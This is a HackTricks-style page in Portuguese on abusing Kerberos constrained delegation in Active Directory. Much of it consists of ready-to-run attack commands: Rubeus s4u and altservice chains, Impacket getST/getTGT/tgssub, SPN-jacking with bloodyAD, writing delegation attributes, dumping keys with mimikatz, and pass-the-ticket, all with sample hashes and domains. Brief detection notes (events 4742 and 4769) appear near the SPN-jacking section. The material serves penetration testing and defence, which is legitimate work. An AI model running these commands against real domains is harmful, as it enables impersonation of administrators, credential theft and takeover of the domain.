# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Usando isso, um Domain admin pode **permitir** que um computador **personifique um usuário ou computador** contra qualquer **service** de uma máquina.

- **Service for User to self (_S4U2self_):** Qualquer **service account que possua um SPN** geralmente pode obter um TGS para si mesma em nome de um usuário arbitrário. Se a conta também tiver [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) em _userAccountControl_, esse TGS será **forwardable**, que é o que torna a protocol transition diretamente útil para a **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Uma **service account** pode obter um TGS em nome de um usuário para os SPNs listados em **msDS-AllowedToDelegateTo**. O evidence ticket usado no S4U2Proxy deve ser um ticket **forwardable** para o serviço que realiza a delegação: um ticket real de cliente para serviço capturado da vítima ou um gerado com **S4U2Self + T2A4D**.

**Nota**: Se um usuário estiver marcado como ‘_Account is sensitive and cannot be delegated_’ no AD, ou for membro de **Protected Users**, geralmente você **não poderá personificá-lo** por meio de constrained delegation. Em domínios modernos, prefira material **AES** em vez de assumir cenários baseados apenas em RC4 ao direcionar contas com delegation habilitada.

Isso significa que, se você **comprometer o hash do service**, poderá **personificar usuários** e obter **acesso**, em nome deles, a qualquer **service** nas máquinas indicadas (possível **privesc**).

Além disso, você **não terá acesso apenas ao serviço que o usuário pode personificar, mas também a qualquer serviço**, porque o SPN (o nome do serviço solicitado) não é verificado (no ticket, essa parte não é criptografada/assinada). Portanto, se você tiver acesso ao **CIFS service**, também poderá ter acesso ao **HOST service** usando, por exemplo, a flag `/altservice` no Rubeus. A mesma fraqueza de troca de SPN é explorada pelo **Impacket getST -altservice** e por outras ferramentas.

Além disso, o **LDAP service access em um DC** é o necessário para explorar um **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Nota do operador:** não confie apenas em capturas de tela do **ADUC** ou do BloodHound para analisar **gMSA/sMSA**. Essas contas geralmente ocultam a aba Delegation usual, portanto enumere diretamente os atributos brutos **`userAccountControl`** e **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs constrained delegation somente Kerberos

Se a conta comprometida tiver **T2A4D**, normalmente você poderá concluir toda a cadeia **`S4U2Self -> S4U2Proxy`** usando apenas a chave/TGT do serviço.<sup>[[2]](#references)</sup>

Se ela tiver apenas **`msDS-AllowedToDelegateTo`** (o modo clássico **"Use Kerberos only"**), a delegation ainda poderá ser abusada, mas o ticket de evidência para S4U2Proxy deverá ser um **ticket real e forwardable de usuário para serviço** para o serviço que realiza a delegation. Na prática, isso significa roubar ou capturar um TGS da vítima a partir do **LSASS/ccache** e fornecê-lo ao segundo estágio (`/tgs:` no Rubeus). Um ticket S4U2Self **não-forwardable** não é suficiente para classic constrained delegation; se esse for seu único ticket de evidência, verifique [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Observações sobre constrained delegation entre domínios (2025+)

Desde o **Windows Server 2012/2012 R2**, o KDC oferece suporte a constrained delegation entre domínios/florestas por meio das extensões S4U2Proxy. Builds modernos (Windows Server 2016–2025) mantêm esse comportamento e adicionam dois SIDs de PAC para sinalizar protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) quando o usuário se autenticou normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) quando um serviço afirmou a identidade por meio de protocol transition.

Espere encontrar `SERVICE_ASSERTED_IDENTITY` dentro do PAC quando protocol transition for usado entre domínios, confirmando que a etapa S4U2Proxy foi concluída com sucesso.<sup>[[1]](#references)</sup>

### Ferramentas Impacket / Linux (altservice e S4U completo)

O Impacket recente (0.11.x+) expõe a mesma cadeia S4U e a troca de SPN que o Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Se preferir forjar primeiro o user ST (por exemplo, tendo apenas o hash offline), combine **ticketer.py** com **getST.py** para S4U2Proxy. `tgssub.py` também é útil quando você já tem um ccache funcional e só precisa trocar a service class para o mesmo host. Consulte a issue aberta #1713 do Impacket para conhecer as particularidades atuais (KRB_AP_ERR_MODIFIED quando o ST forjado não corresponde à chave do SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: redirecionando um alvo de delegação restrita

A delegação restrita clássica autoriza uma **string de SPN** em `msDS-AllowedToDelegateTo`, não um SID de destino imutável. Durante o S4U2Proxy, o KDC resolve a conta que atualmente possui esse SPN e criptografa o service ticket com a chave de longo prazo dessa conta. Portanto, controlar a conta delegadora, além de ter `WriteSPN` sobre outra conta de serviço/computador, pode redirecionar uma restrição de delegação inalterada sem `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Existem duas variantes:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** o SPN permitido está órfão porque seu antigo proprietário foi excluído, renomeado ou teve o SPN removido. Adicione-o diretamente à conta de destino desejada.
- **Live SPN-jacking:** o SPN ainda pertence a uma conta de origem. A validação de SPN duplicado normalmente bloqueia a gravação no destino, portanto `WriteSPN` é necessário em ambos os objetos: remova-o da origem, adicione-o ao destino, obtenha o ticket e restaure o registro original.

O fluxo Linux abstrato a seguir move um SPN permitido, executa S4U como o principal delegador comprometido e reescreve o nome do serviço do ticket para um serviço útil no novo destino.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` é o segundo primitive separado. O ticket S4U2Proxy foi criptografado para a conta que agora possui `$DELEGATED_SPN`; como o nome do serviço do ticket (`sname`) fica fora do corpo criptografado do ticket, as ferramentas podem substituir outra service class/hostname cujo serviço use a mesma chave da conta. O SPN-jacking primeiro altera **qual chave de conta** protege o ticket, enquanto a substituição da service class altera **onde esse ticket é apresentado**.<sup>[[5]](#references)[[6]](#references)</sup>

Para realizar jacking ao vivo, reverta os dois writes LDAP imediatamente após a aquisição do ticket para evitar interromper o serviço legítimo. Em DCs com auditoria de contas de computador habilitada, procure o evento de Security **4742**, no qual `servicePrincipalName` é removido de um computador e adicionado pouco depois a outro, especialmente quando o hostname do SPN difere do `dNSHostName` do destino. Correlacione com o evento **4769**: S4U2Self apresenta a mesma conta como cliente/serviço, enquanto S4U2Proxy preenche **Transited Services**.<sup>[[5]](#references)</sup>

### Automatizando a configuração de delegation com creds de baixo privilégio

Se você já possui **GenericAll/WriteDACL** sobre uma conta de computador ou serviço, pode definir remotamente os atributos necessários sem RSAT usando **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Isso permite criar um caminho de constrained delegation para privesc sem privilégios de DA assim que você puder escrever nesses atributos.

- Etapa 1: **Obter o TGT do serviço permitido**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Existem **outras formas de obter um ticket TGT** ou o **RC4** ou **AES256** sem ser SYSTEM no computador, como o Printer Bug e unconstrained delegation, NTLM relaying e abuso do Active Directory Certificate Service
>
> **Tendo apenas esse ticket TGT (ou seu hash), você pode realizar este ataque sem comprometer o computador inteiro.**

- Passo 2: **Obter o TGS para o serviço personificando o usuário**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Mais informações em ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) e [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Visão geral da Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abusando da Delegation com Impacket (Parte 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Uma visão geral ofensiva do Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Um caso extremo de abuso de WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
